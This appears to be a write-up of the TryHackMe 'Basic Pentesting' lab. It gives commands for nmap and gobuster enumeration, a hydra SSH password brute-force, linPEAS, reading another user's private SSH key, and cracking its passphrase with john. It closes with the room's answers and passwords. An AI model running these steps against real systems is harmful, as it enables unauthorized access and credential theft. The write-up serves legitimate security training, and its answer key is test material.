# Basic Pentesting - TryHackMe Writeup

This is a writeup for the "Basic Pentesting" room on TryHackMe, [here](https://tryhackme.com/room/basicpentestingjt).

---

## Steps

### 1. Deploy the Machine and Connect to the Network
- Deployed the machine via TryHackMe and connected to the provided network.
- Machine IP: `[VICTIM IP]` (e.g., `10.10.16.21`)

### 2. Find the Services Exposed by the Machine
- Used `nmap` to scan for open ports and services:
  ```bash
  nmap -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -sV -p- 10.10.16.21
  ```
- Results:
  ```
  PORT     STATE SERVICE     VERSION
  22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
  80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
  8080/tcp open  http        Apache Tomcat 9.0.7
  ```
- Key services identified: SSH (port 22), HTTP (ports 80 and 8080), Samba (ports 139 and 445), and AJP (port 8009).

### 3. Find the Hidden Directory on the Web Server
- Used `gobuster` to enumerate directories on the web server:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [WORD LIST PATH]
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.16.21 -w ~/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Found a hidden directory: `development` (status code 301).
- Answer: `development`

### 4. User Brute-Forcing to Find Username & Password
- Ran `enum4linux` to enumerate users and Samba shares:
  ```bash
  enum4linux -a [VICTIM IP]
  ```
- Example:
  ```bash
  enum4linux -a 10.10.16.21
  ```
- Identified two users: `jan` and `kay`.
- Found a note in the `development` directory indicating `jan` had a weak password.
- Used `hydra` to brute-force SSH credentials for `jan`:
  ```bash
  hydra -l jan -P [WORD LIST PATH] [VICTIM IP] ssh
  ```
- Example:
  ```bash
  hydra -l jan -P ~/Tools/wordlists/rockyou.txt 10.10.160.212 ssh
  ```
- Discovered credentials:
  - Username: `jan`
  - Password: `armando`

### 5. Access the Server
- Connected to the machine via SSH:
  ```bash
  ssh jan@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh jan@10.10.16.21
  ```
- Entered password `armando` and gained access to `jan@basic2:~$`.
- Service used: `SSH`

### 6. Enumerate the Machine for Privilege Escalation
- Checked privileges; `jan` lacked root access and couldnâ€™t read files in `/home/kay` which stores 'pass.bak' which we are assuming holds a password of some sorts.
- SO we will use linPEAS to enumerate weaknesses and privilege escalation opportunities.
- Downloaded `linpeas.sh` from [PEASS-ng](https://github.com/peass-ng/PEASS-ng/releases) and transferred it to the target:
  ```bash
  scp linpeas.sh jan@[VICTIM IP]:/dev/shm
  ```
- Example:
  ```bash
  scp linpeas.sh jan@10.10.16.21:/dev/shm
  ```
- Entered password `armando` for SCP.
- On the target:
  ```bash
  cd /dev/shm
  chmod +x linpeas.sh  # to make it executable
  ./linpeas.sh
  ```
- `linpeas.sh` identified an SSH private key (`id_rsa`) in `/home/kay/.ssh/`.

### 7. Privilege Escalation to User `kay`
- Navigated to `/home/kay/.ssh/` as `jan` and read the `id_rsa` file:
  ```bash
  cd /home/kay/.ssh/
  ls -la
  cat id_rsa
  ```
- Copied the private key to my local machine, saved it as `kay_id_rsa`, and set permissions:
  ```bash
  nano kay_id_rsa  # Pasted the key
  chmod 600 kay_id_rsa # to make it only viewable by us
  ```
- Attempted SSH with the key:
  ```bash
  ssh -i kay_id_rsa kay@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh -i kay_id_rsa kay@10.10.16.21
  ```
- Prompted for a passphrase, which was unknown at this point.

### 8. Crack the Passphrase
- Used `ssh2john.py` to convert the private key to a crackable format:
  ```bash
  [PATH TO SSH2JOHN] kay_id_rsa > forjohn.txt
  ```
- Example:
  ```bash
  /opt/john/ssh2john.py kay_id_rsa > forjohn.txt
  ```
- Cracked the passphrase with `john`:
  ```bash
  [PATH TO JOHN] forjohn.txt --wordlist=[WORD LIST PATH]
  ```
- Example:
  ```bash
  /opt/john/john forjohn.txt --wordlist=~/Tools/wordlists/rockyou.txt
  ```
- Passphrase found: `beeswax`

### 9. Access `kay` Account and Obtain Final Password
- Logged in as `kay` using the private key and passphrase:
  ```bash
  ssh -i kay_id_rsa kay@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh -i kay_id_rsa kay@10.10.16.21
  ```
- Entered passphrase `beeswax` and gained access to `kay@basic2:~$`.
- Listed files and found `pass.bak`:
  ```bash
  ls
  cat pass.bak
  ```
- Final password: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

---

## Answers to Challenge Questions
1. **Hidden directory on the web server**: `development`
2. **Username**: `jan`
3. **Password**: `armando`
4. **Service used to access the server**: `SSH`
5. **Name of the other user**: `kay`
6. **Final password**: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

---

## Tools Used
- `nmap`: Port scanning and service enumeration.
- `gobuster`: Directory enumeration.
- `enum4linux`: Samba and user enumeration.
- `hydra`: SSH brute-forcing.
- `scp`: File transfer to the target.
- `linpeas.sh`: Privilege escalation enumeration.
- `john` & `ssh2john.py`: Passphrase cracking.

---


